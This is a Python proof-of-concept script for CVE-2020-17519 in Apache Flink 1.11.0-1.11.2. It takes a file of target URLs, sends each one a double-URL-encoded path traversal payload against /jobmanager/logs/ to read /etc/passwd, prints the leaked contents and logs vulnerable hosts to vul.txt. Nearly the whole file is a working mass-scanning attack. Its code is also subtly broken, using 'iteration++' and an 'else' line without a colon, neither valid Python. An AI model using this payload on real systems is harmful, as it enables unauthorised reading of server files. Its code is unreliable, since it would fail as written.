#!/usr/bin/env python
# coding:utf-8
# author:B1anda0
#affected versions are Apache Flink 1.11.0-1.11.2

import requests,sys,colorama
from colorama import *
init(autoreset=True)

DEFAULT_PORT = ':8081'

def verify(urls, iter):
	iteration = iter
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
	payload= '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd' 
	poc=urls+payload
	if iteration <= 1:
		try:
			requests.packages.urllib3.disable_warnings()#Resolve InsecureRequestWarning warning
			response=requests.get(poc,headers=headers,timeout=15,verify=False)
			if response.status_code==200 and "root:x" in str(response.content):
				print(poc)
				print(response.content)
				#Output the vulnerability address in Vul.txt
				f=open('./vul.txt','a')
				f.write(urls)
				f.write('\n')		
			else:
				urls= urls[:-1]+DEFAULT_PORT
				verify(urls, iteration++)
		except:
			print('{} request timeout'.format(urls))
			urls= urls[:-1]+DEFAULT_PORT
			verify(urls, iteration++)
	else
		print('None'.format(urls))


if __name__ == '__main__':
	if len(sys.argv)!=2:
		print('Example:python CVE-2020-17519.py urls.txt')
	else:
		file = open(sys.argv[1])
		for url in file.readlines():
			urls=url.strip()
			if urls[-1]=='/':
				urls=urls[:-1]
			verify(urls, 0)
